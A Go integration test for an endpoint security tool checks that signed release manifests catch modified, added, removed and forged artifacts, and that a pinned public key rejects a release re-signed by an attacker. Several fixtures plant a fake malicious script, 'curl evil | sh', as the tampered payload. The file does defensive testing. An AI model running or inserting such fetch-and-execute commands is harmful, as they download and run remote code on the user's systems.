//go:build integration

package integration

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

// THE SIGNED RELEASE (PLAT-6, `openshieldctl release-manifest` / `verify-release`).
//
// `internal/release` measured at ZERO integration coverage and both subcommands had never been invoked by
// the suite — which is a poor place for a gap, because this is the code that decides whether the thing
// running as root on every endpoint is the thing the project built. A supply-chain control nobody has
// executed end to end is a README.
//
// The unit tests cover Build/Sign/Verify in isolation. What they cannot cover is the OPERATOR PATH: a
// release directory produced by one command and checked by another, with the meta files on disk in the
// shapes each command actually writes and reads.

// releaseKey writes a raw ed25519 private key and returns its path and public half.
func releaseKey(t *testing.T, dir string) (string, ed25519.PublicKey) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "release.key")
	if err := os.WriteFile(path, priv, 0o600); err != nil {
		t.Fatal(err)
	}
	return path, pub
}

// stageRelease creates a release directory holding two plausible artifacts. One is a REAL Go binary, so
// the SBOM step has something to read a module graph out of — an SBOM built over files that are not Go
// binaries is generated successfully and says nothing, which would let the SBOM assertions below pass
// against a release that produced no bill of materials at all.
func stageRelease(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	real, err := os.ReadFile(Binary(t, "openshieldctl"))
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "openshieldctl_linux_amd64"), real, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "openshield-agent_linux_arm64"), []byte("#!/bin/sh\ntrue\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return dir
}

// TestASignedReleaseVerifiesAndAnyTamperingIsNamed.
//
// The three refusals are the point, and the third is the one that motivates signing the SET rather than
// each file: an artifact ADDED after signing passes every per-file check ever written.
func TestASignedReleaseVerifiesAndAnyTamperingIsNamed(t *testing.T) {
	dir := stageRelease(t)
	keyDir := t.TempDir()
	keyPath, _ := releaseKey(t, keyDir)

	out, err := runCapture(t, "openshieldctl", nil, "release-manifest",
		"--dir", dir, "--version", "v9.9.9", "--commit", "deadbeef", "--key", keyPath)
	if err != nil {
		t.Fatalf("signing the release: %v\n%s", err, out)
	}

	// THE PRIVATE KEY MUST NOT SHIP. It is supplied as a path at release time, and a release directory
	// that contains it hands the next release to whoever downloads this one.
	if _, err := os.Stat(filepath.Join(dir, "release.key")); err == nil {
		t.Error("the signing key was written into the release directory")
	}
	for _, name := range []string{"SHA256SUMS.json", "SHA256SUMS.json.sig", "release-key.pub", "sbom.json"} {
		if _, err := os.Stat(filepath.Join(dir, name)); err != nil {
			t.Fatalf("the release is missing %s: %v\n%s", name, err, out)
		}
	}

	// 1. THE UNTAMPERED RELEASE VERIFIES. Without this the refusals below are satisfied by a verifier
	// that refuses everything, which is not a control but a broken command.
	if out, err := runCapture(t, "openshieldctl", nil, "verify-release", "--dir", dir); err != nil {
		t.Fatalf("a freshly signed release did not verify: %v\n%s", err, out)
	}

	// The SBOM is over the BINARY's recorded module graph, not the source tree — and it is written before
	// the manifest, so the signature covers it.
	body, err := os.ReadFile(filepath.Join(dir, "sbom.json"))
	if err != nil {
		t.Fatal(err)
	}
	var sbom struct {
		Artifacts []struct {
			Artifact   string `json:"artifact"`
			Components []struct {
				Name string `json:"name"`
			} `json:"components"`
		} `json:"artifacts"`
	}
	if err := json.Unmarshal(body, &sbom); err != nil {
		t.Fatal(err)
	}
	if len(sbom.Artifacts) == 0 || len(sbom.Artifacts[0].Components) == 0 {
		t.Fatalf("the SBOM lists no components for any artifact. A bill of materials that names nothing "+
			"passes procurement and answers no question:\n%s", body)
	}

	// 2. A CHANGED BYTE. The archetypal supply-chain substitution: same name, same length, different code.
	t.Run("a modified artifact is named", func(t *testing.T) {
		victim := filepath.Join(dir, "openshield-agent_linux_arm64")
		orig, err := os.ReadFile(victim)
		if err != nil {
			t.Fatal(err)
		}
		defer os.WriteFile(victim, orig, 0o755)
		tampered := append([]byte(nil), orig...)
		tampered[len(tampered)-2] ^= 0xff // same LENGTH, so a size check would not notice
		if err := os.WriteFile(victim, tampered, 0o755); err != nil {
			t.Fatal(err)
		}
		out, err := runCapture(t, "openshieldctl", nil, "verify-release", "--dir", dir)
		if err == nil {
			t.Fatalf("a modified artifact VERIFIED — the check is over names or sizes, not bytes:\n%s", out)
		}
		if !contains(out, "openshield-agent_linux_arm64") {
			t.Errorf("the refusal does not name the artifact that failed, so an operator holding a "+
				"download cannot tell which file to distrust:\n%s", out)
		}
	})

	// 3. AN ARTIFACT ADDED AFTER SIGNING. It is not in the manifest, so nothing the manifest names is
	// wrong — a verifier that walks the manifest and stops reports a healthy release while an extra
	// binary sits in the directory an installer may well execute.
	t.Run("an artifact added after signing is named", func(t *testing.T) {
		extra := filepath.Join(dir, "openshield-helper_linux_amd64")
		if err := os.WriteFile(extra, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
			t.Fatal(err)
		}
		defer os.Remove(extra)
		out, err := runCapture(t, "openshieldctl", nil, "verify-release", "--dir", dir)
		if err == nil {
			t.Fatalf("an artifact ADDED after signing verified. Per-file digests cannot catch this, which "+
				"is the whole reason one signature covers the SET:\n%s", out)
		}
		if !contains(out, "openshield-helper_linux_amd64") {
			t.Errorf("the refusal does not name the unlisted artifact:\n%s", out)
		}
	})

	// 4. A REMOVED ARTIFACT, reported distinctly from a modified one: "you are missing a file" and "this
	// file is not what we built" call for different responses.
	t.Run("a removed artifact is named", func(t *testing.T) {
		victim := filepath.Join(dir, "openshield-agent_linux_arm64")
		orig, err := os.ReadFile(victim)
		if err != nil {
			t.Fatal(err)
		}
		defer os.WriteFile(victim, orig, 0o755)
		if err := os.Remove(victim); err != nil {
			t.Fatal(err)
		}
		out, err := runCapture(t, "openshieldctl", nil, "verify-release", "--dir", dir)
		if err == nil {
			t.Fatalf("a release missing an artifact verified:\n%s", out)
		}
		if !contains(out, "missing") {
			t.Errorf("a removed artifact was not reported as missing:\n%s", out)
		}
	})

	// 5. A REWRITTEN MANIFEST. The signature is checked FIRST for a reason: if the manifest is the
	// attacker's, verifying files against the digests it lists reports a healthy release with certainty.
	t.Run("a rewritten manifest fails on the signature", func(t *testing.T) {
		mf := filepath.Join(dir, "SHA256SUMS.json")
		orig, err := os.ReadFile(mf)
		if err != nil {
			t.Fatal(err)
		}
		defer os.WriteFile(mf, orig, 0o644)

		// A COHERENT forgery: the attacker swaps an artifact AND updates the manifest to match, so every
		// digest in it is correct. Only the signature distinguishes this from a real release.
		victim := filepath.Join(dir, "openshield-agent_linux_arm64")
		vorig, err := os.ReadFile(victim)
		if err != nil {
			t.Fatal(err)
		}
		defer os.WriteFile(victim, vorig, 0o755)
		if err := os.WriteFile(victim, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
			t.Fatal(err)
		}
		var m map[string]any
		if err := json.Unmarshal(orig, &m); err != nil {
			t.Fatal(err)
		}
		for _, e := range m["entries"].([]any) {
			ent := e.(map[string]any)
			if ent["name"] == "openshield-agent_linux_arm64" {
				ent["sha256"] = sha256Hex(t, victim)
				ent["size"] = float64(len([]byte("#!/bin/sh\ncurl evil | sh\n")))
			}
		}
		forged, err := json.MarshalIndent(m, "", "  ")
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(mf, forged, 0o644); err != nil {
			t.Fatal(err)
		}
		out, err := runCapture(t, "openshieldctl", nil, "verify-release", "--dir", dir)
		if err == nil {
			t.Fatalf("a manifest rewritten to match a swapped artifact VERIFIED:\n%s", out)
		}
		if !contains(out, "signature") {
			t.Errorf("the refusal blames the digests rather than the signature. A coherent forgery has "+
				"correct digests; the signature is the only thing that can reject it:\n%s", out)
		}
	})
}

// TestAPinnedKeyRefusesAReleaseSignedByAnyoneElse is the authenticity claim, and the reason it needs
// its own flag at all.
//
// EVERYTHING IN A RELEASE DIRECTORY IS UNDER THE ATTACKER'S CONTROL. A verifier that reads its public key
// from there answers "is this set internally consistent" — a question an attacker who re-signs the whole
// set with a key of their own can arrange a "yes" to, which is what the unpinned half of this test shows.
// Only a key from somewhere else can answer "did the project sign this".
//
// Both halves run against the SAME re-signed directory, so the difference between them is the pinned key
// and nothing else.
func TestAPinnedKeyRefusesAReleaseSignedByAnyoneElse(t *testing.T) {
	dir := stageRelease(t)
	keyDir := t.TempDir()
	honest, honestPub := releaseKey(t, keyDir)
	if out, err := runCapture(t, "openshieldctl", nil, "release-manifest",
		"--dir", dir, "--version", "v9.9.9", "--commit", "deadbeef", "--key", honest); err != nil {
		t.Fatalf("signing: %v\n%s", err, out)
	}
	pin := filepath.Join(keyDir, "project.pub")
	if err := os.WriteFile(pin, honestPub, 0o644); err != nil {
		t.Fatal(err)
	}

	// A GENUINE release verifies under its pin. Without this the refusal below is satisfied by a --key
	// flag that refuses everything, which is not authenticity but a broken command.
	out, err := runCapture(t, "openshieldctl", nil, "verify-release", "--dir", dir, "--key", pin)
	if err != nil {
		t.Fatalf("a genuine release was refused under its own pinned key: %v\n%s", err, out)
	}
	if !contains(out, release_fingerprint(t, honestPub)) {
		t.Errorf("the output does not identify the key it verified against, so two operators cannot "+
			"establish they checked the same one:\n%s", out)
	}

	// THE ATTACK: swap a binary and re-sign the entire release, replacing the shipped public key.
	if err := os.WriteFile(filepath.Join(dir, "openshield-agent_linux_arm64"),
		[]byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	attacker, attackerPub := releaseKey(t, t.TempDir())
	if out, err := runCapture(t, "openshieldctl", nil, "release-manifest",
		"--dir", dir, "--version", "v9.9.9", "--commit", "deadbeef", "--key", attacker); err != nil {
		t.Fatalf("the attacker's re-sign failed for an unrelated reason: %v\n%s", err, out)
	}
	shipped, err := os.ReadFile(filepath.Join(dir, "release-key.pub"))
	if err != nil {
		t.Fatal(err)
	}
	if string(shipped) != string(attackerPub) {
		t.Fatal("the re-signed release does not carry the attacker's public key, so neither half below " +
			"tests what it claims")
	}

	// 1. UNPINNED, THE ATTACK SUCCEEDS — the limit, still true, and asserted rather than assumed. If this
	// ever starts failing, the unpinned path has gained a check and this test must be rewritten to say so.
	out, err = runCapture(t, "openshieldctl", nil, "verify-release", "--dir", dir)
	if err != nil {
		t.Fatalf("the re-signed release was refused WITHOUT a pinned key, which the unpinned path has no "+
			"way to do: %v\n%s", err, out)
	}
	// And it says so. A success message that does not state the limit is how an operator comes to believe
	// they checked authenticity (D31).
	if !contains(out, "INTEGRITY only") || !contains(out, "--key") {
		t.Errorf("an unpinned verification succeeded without stating that authenticity was NOT "+
			"established, or without saying how to establish it:\n%s", out)
	}

	// 2. PINNED, IT IS REFUSED. Same directory, same bytes, one extra input.
	out, err = runCapture(t, "openshieldctl", nil, "verify-release", "--dir", dir, "--key", pin)
	if err == nil {
		t.Fatalf("a release re-signed with an ATTACKER'S key verified under the project's pinned key. "+
			"The pin is being ignored, or the shipped key is being used as a fallback:\n%s", out)
	}
	if !contains(out, "signature") {
		t.Errorf("the refusal does not blame the signature. Every digest in a re-signed release is "+
			"correct; the signature is the only thing that can reject it:\n%s", out)
	}
}

// TestAnUnusablePinnedKeyIsRefusedRatherThanIgnored.
//
// The error path is where a pin gets quietly dropped. A verifier that falls back to the shipped key when
// the pin cannot be read reintroduces the entire gap — and an attacker who can modify the download can
// often arrange the condition that triggers the fallback, so the fallback is not a convenience but a
// bypass with a friendly name.
func TestAnUnusablePinnedKeyIsRefusedRatherThanIgnored(t *testing.T) {
	dir := stageRelease(t)
	keyDir := t.TempDir()
	honest, _ := releaseKey(t, keyDir)
	if out, err := runCapture(t, "openshieldctl", nil, "release-manifest",
		"--dir", dir, "--version", "v9.9.9", "--commit", "deadbeef", "--key", honest); err != nil {
		t.Fatalf("signing: %v\n%s", err, out)
	}

	// The release is GENUINE, so a fallback to the shipped key would SUCCEED — which is what makes this
	// isolating. A tampered release would be refused either way and prove nothing about the fallback.
	for _, tc := range []struct{ name, body string }{
		{"absent", ""},
		{"truncated", "not-a-key"},
		{"empty", " "},
	} {
		t.Run(tc.name, func(t *testing.T) {
			pin := filepath.Join(t.TempDir(), "pin.pub")
			if tc.name != "absent" {
				if err := os.WriteFile(pin, []byte(tc.body), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			out, err := runCapture(t, "openshieldctl", nil, "verify-release", "--dir", dir, "--key", pin)
			if err == nil {
				t.Fatalf("an unusable pinned key (%s) verified anyway — the command fell back to the key "+
					"shipped inside the release, which is the gap --key exists to close:\n%s", tc.name, out)
			}
		})
	}
}

// release_fingerprint mirrors internal/release.Fingerprint. Recomputed here rather than imported so the
// assertion is against the documented VALUE (first 8 bytes of the key's SHA-256, hex) and not against
// whatever the implementation currently returns — an assertion that calls the code under test agrees
// with it by construction.
func release_fingerprint(t *testing.T, pub []byte) string {
	t.Helper()
	sum := sha256.Sum256(pub)
	return hex.EncodeToString(sum[:8])
}

// sha256Hex is what the forged manifest needs to be COHERENT — an incoherent forgery would be rejected
// by the digest check and never reach the signature check the scenario is about.
func sha256Hex(t *testing.T, path string) string {
	t.Helper()
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(body)
	return hex.EncodeToString(sum[:])
}
